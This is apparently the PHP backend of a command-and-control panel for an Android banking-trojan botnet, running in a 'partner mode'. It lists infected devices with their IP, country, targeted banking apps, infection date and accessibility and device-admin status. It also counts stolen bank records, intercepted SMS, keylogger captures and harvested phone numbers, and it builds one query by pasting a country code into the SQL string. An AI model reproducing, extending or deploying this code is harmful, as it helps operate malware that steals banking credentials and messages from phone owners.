<?php
include('/var/www/config.php');
class database{

	static private $_connection = null;
	static function Connection()
	{
		if (!self::$_connection)
		{
			self::$_connection = new PDO('mysql:host='.server.';dbname='.db, user, passwd);
		}
		return self::$_connection;
	}

	function getBots($currentPage, $sorting, $limit, $countrycode){
		/*
		0 - online
		1 - offline
		2 - dead
		3 - Exist App Banks
		3 - No Exist App Banks
		5 - statBank==1
		6 - statCC==1
		7 - statMail==1
		*/
		$strMySQL = "SELECT * FROM bots ";//---Sorting---
		$paramsMySQL = "";
		if (preg_match('/1/', $sorting)) {
			$paramsMySQL = "WHERE ";
			if(substr($sorting,0,1)=="1"){//online
				$paramsMySQL  = $paramsMySQL."(TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=120) AND ";
			}
			if(substr($sorting,1,1)=="1"){//offline
				$paramsMySQL  = $paramsMySQL."((TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=144000)) AND ";
			}
			if(substr($sorting,2,1)=="1"){//dead
				$paramsMySQL  = $paramsMySQL."(TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=144001) AND ";
			}
			if(substr($sorting,3,1)=="1"){//install banks
				$paramsMySQL  = $paramsMySQL."(banks != '') AND ";
			}
			if(substr($sorting,4,1)=="1"){//no install banks
				$paramsMySQL  = $paramsMySQL."((banks = '') OR (banks IS NULL)) AND ";
			}
			if(substr($sorting,5,1)=="1"){//statBanks
				$paramsMySQL  = $paramsMySQL."(statBanks = '1') AND ";
			}
			if(substr($sorting,6,1)=="1"){//statCards
				$paramsMySQL  = $paramsMySQL."(statCards = '1') AND ";
			}
			if(substr($sorting,7,1)=="1"){//statMails
				$paramsMySQL  = $paramsMySQL."(statMails = '1') AND ";
			}
			if(substr($sorting,8,1)=="1" && strlen($countrycode) > 1){//botFilterCountry
				$paramsMySQL  = $paramsMySQL."(country = '".$countrycode."') AND ";
			}
			if(substr($paramsMySQL, -5) == " AND " ){
				$paramsMySQL = substr($paramsMySQL,0,-5);
			}
		}
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$limitBots=(strlen($limit)>0)?$limit:10; //select data db!
		$countBots = $connection->query("SELECT COUNT(*) as count FROM bots $paramsMySQL")->fetchColumn();
		$pages = ceil($countBots / $limitBots);
		$startLimit = ($currentPage - 1) * $limitBots;
		//return  $strMySQL.$paramsMySQL." LIMIT $startLimit, $limitBots";
		$strMySQL = $strMySQL.$paramsMySQL." LIMIT $startLimit, $limitBots";

		$statement = $connection->prepare($strMySQL); 
		$statement->execute();
		$json = [
			"bots"=>[],
			"pages"=>(string)$pages,
			"currentPage"=>(string)$currentPage
		];
		$index = 0;
		
		foreach($statement as  $row){
			$secondsConnect = strtotime(date('Y-m-d H:i:s'))-strtotime($row['lastconnect']);
			$index++;
			$json['bots'] []= [
				'id' => (string)$row['idbot'],
				'version' => (string)$row['android'],
				'tag'=> (string)$row['TAG'],
				'ip' => (string)$row['ip'],
				'commands' => (string)$row['commands'],
				'country' => (string)$row['country'],
				'banks'=> (string)$row['banks'],
				'lastConnect' => (string)$secondsConnect,
				'dateInfection' => (string)$row['date_infection'],
				'comment' => (string)$row['comment'],
				'statScreen' => (string)$row['statScreen'],
				'statAccessibility' => (string)$row['statAccessibility'],
				'statProtect' => (string)$row['statProtect'],
				'statBanks' => (string)$row['statBanks'],
				'statModule' => (string)$row['statDownloadModule'],
				'statAdmin' => (string)$row['statAdmin']
			];
		}
		return json_encode($json);
	}

	private function tableExists($tblName)
	{
		$connection = self::Connection();
		$statement = $connection->prepare("SELECT COUNT(*) as cnt from INFORMATION_SCHEMA.TABLES where table_name = ?");	
		$statement->execute([$tblName]);
		$tableCount = $statement->fetchColumn();
		if ( $tableCount != 0 )
			return true;
		return false;
	}

	function statLogs($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if ( !$this->tableExists("LogsSMS_$idbot") )
			return 0;

		$statement = $connection->prepare("SELECT COUNT(*) as cnt FROM LogsSMS_$idbot");//Logs Bot
		$statement->execute();
		$cnt = $statement->fetchColumn();
		return $cnt > 0 ? 1 : 0;
	}
	
	function statKeylogger($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if ( !$this->tableExists("keylogger_$idbot") )
			return 0;

		$statement = $connection->prepare("SELECT COUNT(*) as cnt FROM keylogger_$idbot");//Logs Bot Keylogger
		$statement->execute();
		$cnt = $statement->fetchColumn();
		return $cnt > 0 ? 1 : 0;
	}

	function statLogsSMS($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsBotsSMS WHERE idbot=?");//Logs Bot SMS
		$statement->execute([$idbot]);
		return $statement->fetchColumn();
	}
	
	function statLogsApp($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsListApplications WHERE idbot= ? ");//Logs Bot App
		$statement->execute([$idbot]);
		return $statement->fetchColumn();
	}

	function statLogsNumber($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsPhoneNumber WHERE idbot= ? ");//Logs Bot PhoneNumber
		$statement->execute([$idbot]);
		return $statement->fetchColumn();
	}


	function mainStats(){
		/*
		Bots
		Online
		Offline
		Deads
		Banks
		CC
		Mails
		*/
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$countBots = $connection->query("SELECT COUNT(*) as count FROM bots")->fetchColumn();
		$online = $connection->query("SELECT COUNT(*) as count FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=120)")->fetchColumn();
		$offline = $connection->query("SELECT COUNT(*) as count FROM bots WHERE ((TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=144000))")->fetchColumn();
		$dead = $connection->query("SELECT COUNT(*) as count FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=144001)")->fetchColumn();
		$banks = $connection->query("SELECT COUNT(*) as count FROM logsBank")->fetchColumn();
		 //$cards = $connection->query("SELECT COUNT(*) as count FROM logsCC")->fetchColumn();
		//$mails = $connection->query("SELECT COUNT(*) as count FROM logsMail")->fetchColumn();
		return json_encode([
			"bots"=>(string)$countBots,
			"online"=>(string)$online,
			"offline"=>(string)$offline,
			"dead"=>(string)$dead,
			"banks"=>(string)$banks
			
		]);
	}
	
		function getGlobalSettings(){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$row = $connection->query("SELECT * FROM settings WHERE 1 LIMIT 1")->fetch();
		if (!$row)
			return json_encode(["error"=>"No Data Settings"]);

		return json_encode([
			'arrayUrl'=> '',
			'timeInject' => '',
			'timeCC' => '',
			'timeMail' => '',
			'timeProtect' => '',
			'updateTableBots' => (string)$row['updateTableBots'],
			'pushTitle' => '',
			'pushText' => '',
			'key' => 'THIS IS PARTNER MODE',
			'version' => 'PARTNER'
		]);
	}


}

/*DATABASE*/

$restapi = new restapi();
$restapi->main(base64_decode(htmlspecialchars(isset($_POST["params"]) ? $_POST["params"] : "")));

class restapi{
	function main($params){
		$database = new database(); 
		$params = json_decode($params);
		switch($params->request){
			case "getBots": 
			// '{"request":"getBots","currentPage":"1","sorting":"0101010","botsperpage":"6"}'
				echo $database->getBots($params->currentPage, isset($params->sorting) ? $params->sorting : "0000000", $params->botsperpage, '');
				break;
			case "mainStats": 
			// '{"request":"mainStats"}'
				echo $database->mainStats();
				break;
            case "getGlobalSettings": 
			    echo $database->getGlobalSettings();

				break;
			default:
				echo '{"error":"this is partner mode"}';
		}
	}
}



?>
